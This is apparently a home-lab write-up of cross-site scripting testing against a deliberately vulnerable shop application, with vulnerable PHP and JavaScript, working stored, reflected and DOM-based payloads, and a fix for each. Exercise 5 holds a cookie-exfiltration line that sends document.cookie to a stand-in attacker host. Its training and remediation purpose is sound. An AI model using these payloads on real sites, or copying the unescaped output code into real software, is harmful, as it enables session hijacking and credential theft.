# Cross-Site Scripting (XSS) — All Types

## Overview

As part of a structured assessment of the GingerByte e-commerce application in my home lab, I examined the application for cross-site scripting vulnerabilities across all three XSS categories: Stored, Reflected, and DOM-Based.

Eight exercises were completed, confirming exploitable XSS across multiple surfaces. In every case the root cause was the same — user-controlled input reached an output context (HTML, a DOM property) without sanitisation — but the attack path, persistence, and defensive implications differed significantly between types.

> **Scope:** All testing documented here was performed against systems in my isolated home lab. The application was deliberately configured to be vulnerable for training purposes.

---

## Lab Scope

| System | Role |
|---|---|
| Kali Linux | Attacker |
| GingerByte (Docker, port 8080) | Target |

---

## XSS Type Comparison

| Type | Payload reaches server? | Payload stored? | Execution trigger | Who is affected? |
|---|---|---|---|---|
| Stored | ✅ Yes | ✅ Yes | Any visitor loads the page | Every visitor automatically |
| Reflected | ✅ Yes | ❌ No | Victim clicks a crafted link | Only victims who follow the link |
| DOM-Based | ❌ No | ❌ No | Victim loads a crafted URL | Only victims who follow the link — server never sees payload |

---

## Part 1 — Stored XSS (Exercises 1–6)

### Surface

The product review comment field on `/product.php`. Logged-in users submit reviews via a POST form. The `comment` field is stored directly in the `reviews` table and echoed raw into the HTML response for every subsequent visitor.

### Vulnerable Code

**Storage — `product.php` (POST handler):**

```php
$comment = $_POST['comment'] ?? ''; // no sanitisation
$conn->query("INSERT INTO reviews (product_id, user_id, username, rating, comment)
              VALUES ($product[id], $uid, '$uname', $rating, '$comment')");
```

The comment is inserted into the database raw, with no encoding or stripping applied.

**Display — `product.php` (review render loop):**

```php
<!-- VULNERABILITY: Stored XSS — comment echoed raw -->
<div class="review-body"><?php echo $r['comment']; ?></div>
```

`innerHTML` semantics apply here: the browser parses the value of `$r['comment']` as HTML. Any markup or event handler in a stored comment is executed as code.

---

### Exercise 1 — Confirm HTML rendering

**Payload submitted as review:**

```html
<b>hello</b>
```

**Outcome:** The word "hello" appeared in bold in the reviews section. The browser rendered the `<b>` tag as markup rather than displaying it as literal text, confirming that the comment field is an unescaped HTML output context.

**Significance:** This is the first indicator of a stored XSS surface — if HTML tags render, JavaScript will execute.

---

### Exercise 2 — Script tag execution

**Payload:**

```html
<script>alert(1)</script>
```

**Outcome:** An alert dialog appeared on every page load, for any user who visited the product page, without any further interaction.

**Significance:** Confirms that `<script>` tags inserted via the review field execute in the browser. The payload persists in the database and fires automatically for every visitor.

---

### Exercise 3 — Event handler bypass

**Payload:**

```html
<img src="x" onerror="alert(2)">
```

**Outcome:** Alert showing `2` fired on page load. The browser attempted to load `src="x"`, failed, and executed the `onerror` handler.

**Significance:** Demonstrates payload delivery without a `<script>` tag. Event handler payloads are the standard bypass when `<script>` tags are filtered, stripped, or blocked by a WAF rule.

---

### Exercise 4 — Mouse event handler

**Payload:**

```html
<button onmouseover="alert(4)">Hover over me</button>
```

**Outcome:** A button was rendered in the reviews section. Hovering the cursor over it triggered the alert.

**Significance:** Shows that any HTML element with an event attribute is a valid execution vehicle. `onmouseover` requires a user interaction (hover), unlike `onerror` which fires automatically — useful to know when testing whether execution is user-triggered or automatic.

---

### Exercise 5 — Session cookie theft

**Payload:**

```html
<img src=x onerror="alert(document.cookie)">
```

**Outcome:** Alert displayed the live session cookie: `PHPSESSID=0ef36aef7ea5a1311469a17d4b66b441`.

**Significance:** This is the primary real-world impact of XSS. In an actual engagement, `alert()` would be replaced with an exfiltration request:

```html
<img src=x onerror="fetch('http://ATTACKER:8000/?c='+document.cookie)">
```

The attacker's server logs the cookie. Replaying it in a browser grants full access to the victim's session without needing their credentials.

---

### Exercise 6 — DOM manipulation / defacement

**Payload:**

```html
<img src=x onerror="document.body.style.background='red'">
```

**Outcome:** The entire page background turned red for every visitor loading the product page.

**Significance:** Demonstrates that XSS is not limited to script execution — the attacker controls the entire DOM. In a real engagement this could be used to overlay a fake login form to harvest credentials, redirect users to a phishing page, or deface the site.

---

### Stored XSS — Security Impact

Because the payload persists in the database, it fires for every visitor without any attacker involvement after initial submission. This distinguishes stored XSS from all other types:

- No crafted link needs to be delivered
- No victim interaction is required beyond visiting the product page
- A single submission affects all future visitors — including administrators

---

### Stored XSS — Remediation

**Primary fix — encode output at the point of display:**

```php
// SECURE
<div class="review-body"><?php echo htmlspecialchars($r['comment'], ENT_QUOTES, 'UTF-8'); ?></div>
```

`htmlspecialchars()` converts `<`, `>`, `"`, `'`, and `&` to HTML entities, preventing the browser from interpreting them as markup.

**Secondary fix — use a prepared statement for the INSERT:**

```php
$stmt = $conn->prepare(
    "INSERT INTO reviews (product_id, user_id, username, rating, comment) VALUES (?, ?, ?, ?, ?)"
);
$stmt->bind_param('iiisi', $product['id'], $uid, $uname, $rating, $comment);
$stmt->execute();
```

This eliminates the SQL injection in the comment field as well.

**Defence in depth — Content Security Policy:**

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Prevents inline script execution if encoding is ever missed.

---

## Part 2 — Reflected XSS (Exercise 7)

### Surface

The `q` GET parameter of `/search.php`. The search term is echoed directly into the HTML response in three locations without encoding.

### Vulnerable Code

```php
$q = $_GET['q'] ?? ''; // no sanitisation
```

**Sink 1 — search input value attribute:**

```html
<input type="text" name="q" value="<?= $q ?>">
```

**Sink 2 — results heading:**

```html
<strong><?= $q ?></strong>
```

**Sink 3 — no-results message:**

```html
No products found for <strong><?= $q ?></strong>
```

In all three cases, `$q` is inserted into the HTML document raw. Any HTML or JavaScript in the value is parsed and executed by the browser.

---

### Exploitation

**Payload:**

```
<img src=x onerror=alert(document.cookie)>
```

**Crafted URL:**

```
http://192.168.50.50:8080/search.php?q=<img src=x onerror=alert(document.cookie)>
```

**What happens:**

1. The victim clicks the crafted link.
2. Their browser sends a GET request to `/search.php` with `q=<img src=x onerror=alert(document.cookie)>`.
3. PHP builds the HTML response and inserts the raw `$q` value into the three sink locations.
4. The browser parses the response, encounters the injected `<img>` tag, fails to load `src="x"`, and fires the `onerror` handler.
5. `document.cookie` is exposed — or exfiltrated in a real scenario.

---

### Key Distinction from Stored XSS

The payload is **not saved anywhere**. It exists only in the URL. No alert fires unless a victim loads the crafted URL. An attacker would deliver this through a phishing email, a malicious redirect, or a link in another compromised page.

---

### Security Impact

- Session hijacking via cookie exfiltration
- Credential harvesting via DOM manipulation or phishing overlay
- Keylogging via `addEventListener` on form inputs
- Forced redirects via `document.location`

Impact is scoped to victims who follow the crafted link — unlike stored XSS, it does not affect every visitor automatically.

---

### Remediation

**Encode at every output point:**

```php
$q_safe = htmlspecialchars($q, ENT_QUOTES, 'UTF-8');
```

```html
<input type="text" name="q" value="<?= $q_safe ?>">
...
<strong><?= $q_safe ?></strong>
...
No products found for <strong><?= $q_safe ?></strong>
```

`ENT_QUOTES` encodes both `"` and `'`, closing the attribute injection vector as well as the HTML body injection vector.

---

## Part 3 — DOM-Based XSS (Exercise 8)

### Surface

The `dom-search.php` page. A JavaScript function reads the URL fragment (`location.hash`) and writes it into the DOM via `innerHTML` without sanitisation. Because the fragment is never transmitted to the server, the entire attack is client-side.

### Vulnerable Code

```javascript
function readHashFilter() {
    var hash = location.hash.slice(1); // strip leading #

    if (hash) {
        // VULNERABILITY: innerHTML used without sanitisation
        document.getElementById('filter-display').innerHTML =
            'Filtering by: ' + decodeURIComponent(hash);
    }
}

readHashFilter();
window.addEventListener('hashchange', readHashFilter);
```

`innerHTML` parses its value as HTML. The URL fragment — everything after `#` — is read directly and written to the DOM without encoding, sanitisation, or validation.

---

### Why the Server Is Not Involved

Per RFC 3986, the fragment identifier (`#...`) is a client-side construct. It is not included in HTTP requests — the browser strips it before sending the request to the server. This means:

- The web server never receives the payload
- PHP never processes it
- No WAF, no server-side filter, and no PHP `htmlspecialchars()` call can prevent this vulnerability
- The server's access logs show only a clean GET request with no payload visible

---

### Exploitation

**Payload:**

```
<img src=x onerror=alert('DOM-XSS')>
```

**Crafted URL:**

```
http://192.168.50.50:8080/dom-search.php#<img src=x onerror=alert('DOM-XSS')>
```

**What happens:**

1. Victim loads the crafted URL.
2. Browser sends `GET /dom-search.php` to the server — fragment is absent.
3. Server returns the normal page with no payload in the response.
4. Browser runs `readHashFilter()`.
5. `location.hash` returns `#<img src=x onerror=alert('DOM-XSS')>`.
6. After `slice(1)`, the `#` is stripped.
7. The remaining string is assigned to `innerHTML` — the browser parses it as HTML, creates the `<img>` element, fails to load `src="x"`, and fires `onerror`.
8. `alert('DOM-XSS')` executes.

**What the server log shows:**

```
GET /dom-search.php HTTP/1.1 200
```

No payload. No evidence of the attack in any server-side log.

---

### Evidence

The Network tab captured during testing confirmed this: the only request to the server was a clean `GET /dom-search.php` with a 200 response. The payload that caused JavaScript execution was never transmitted.

---

### Security Impact

The same as reflected XSS — session hijacking, credential harvesting, DOM manipulation — with the additional property that the payload is invisible to server-side logging and security tooling:

- Server access logs contain no evidence of the attack
- WAFs and IDS systems operating at the network/HTTP layer cannot detect or block it
- The attack works even on applications that correctly apply `htmlspecialchars()` server-side, because PHP is never involved

---

### Remediation

**Primary fix — replace `innerHTML` with `textContent`:**

```javascript
// SECURE: textContent treats the value as plain text, not HTML
document.getElementById('filter-display').textContent =
    'Filtering by: ' + decodeURIComponent(hash);
```

`textContent` does not parse HTML. Any injected markup is displayed as literal characters rather than executed.

**Alternative — sanitise before writing to innerHTML:**

```javascript
// Using DOMPurify (must be loaded)
display.innerHTML = 'Filtering by: ' + DOMPurify.sanitize(decodeURIComponent(hash));
```

**Dangerous sink reference — avoid passing user-controlled data to:**

| Sink | Why it is dangerous |
|---|---|
| `element.innerHTML` | Parses value as HTML |
| `element.outerHTML` | Parses value as HTML |
| `document.write()` | Parses value as HTML |
| `eval()` | Executes value as JavaScript |
| `setTimeout(string)` | Executes string as JS when first arg is a string |
| `element.setAttribute('onclick', ...)` | Sets an event handler |

---

## Key Lessons

- All three XSS types share the same root cause: user-supplied input reaches an output context without sanitisation. The difference is **where** processing happens and which defences are effective.

- **Stored XSS** is the highest severity: the payload persists and fires automatically for every visitor. No delivery mechanism required after the initial submission.

- **Reflected XSS** requires the victim to follow a crafted link. Social engineering (phishing, malicious redirect) is the delivery mechanism. The payload exists only in the HTTP response and is never stored.

- **DOM-Based XSS** is entirely client-side. The server never sees the payload, making it invisible to server-side logging, WAFs, and PHP-level output encoding. Detection requires client-side monitoring or browser security tooling.

- **`<script>` tags injected via `innerHTML` do not execute in modern browsers** — this is a browser-level safety measure, not a site defence. Event-handler payloads (`onerror`, `onload`, `onmouseover`) bypass this restriction and are preferred for DOM XSS and as WAF bypass vectors.

- **Output encoding must match the context**: `htmlspecialchars(ENT_QUOTES)` for HTML output, `textContent` instead of `innerHTML` for DOM writes. The same data may appear in multiple contexts and each requires its own encoding.

---

## Assessment Summary

Three distinct XSS vulnerability classes were identified and exploited across the GingerByte application.

**Stored XSS** was present in the product review comment field (`/product.php`). The `comment` value was inserted into the database without sanitisation and echoed raw via `<?php echo $r['comment']; ?>` into every visitor's page. Six payloads were confirmed: HTML rendering, `<script>` execution, `onerror` event handlers, `onmouseover` handlers, session cookie exfiltration via `document.cookie`, and full DOM manipulation (background colour change). The fix is `htmlspecialchars($r['comment'], ENT_QUOTES, 'UTF-8')` at the output point and a prepared statement at the INSERT.

**Reflected XSS** was present in the `q` GET parameter of `/search.php`. The value of `$_GET['q']` was echoed raw into three HTML output points — the input value attribute and two text nodes — without encoding. An attacker could craft a URL containing an event-handler payload that executes in the victim's browser on click. The fix is `htmlspecialchars($q, ENT_QUOTES, 'UTF-8')` applied at all three output points.

**DOM-Based XSS** was present in `/dom-search.php`. The page's `readHashFilter()` function read the URL fragment via `location.hash` and wrote it to the DOM using `innerHTML` without sanitisation. Because the fragment is a client-side construct never transmitted to the server, the PHP application and any server-side controls were entirely bypassed. A crafted URL such as `dom-search.php#<img src=x onerror=alert(document.cookie)>` caused the browser to parse the injected payload as HTML and execute the event handler. The fix is replacing `innerHTML` with `textContent`.
